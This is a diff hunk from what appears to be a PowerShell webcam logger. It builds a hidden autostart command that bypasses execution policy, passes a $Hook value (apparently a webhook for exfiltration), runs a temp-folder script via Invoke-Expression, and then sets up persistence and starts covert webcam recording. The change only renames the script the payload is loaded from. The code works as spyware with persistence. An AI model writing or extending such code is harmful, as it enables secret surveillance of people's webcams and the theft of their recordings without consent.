@@ -98,7 +98,7 @@ if(-not (Test-Path -Path "ffmpeg/ffmpeg.exe" -PathType Leaf)){
     Remove-Item "7z.exe" -Force;
 }
 
-$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item camlog.ps1 | Invoke-Expression;sleep 5;exit');
+$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item ' + $name + '.ps1 | Invoke-Expression;sleep 5;exit');
 
 Add-LoggerPersistency "camlog" -Command $autostart -Days $DaysRun;
 Start-WebcamLogger -RecordTime $RecordTime -TimesRun $TimesRun -Delay $Delay;
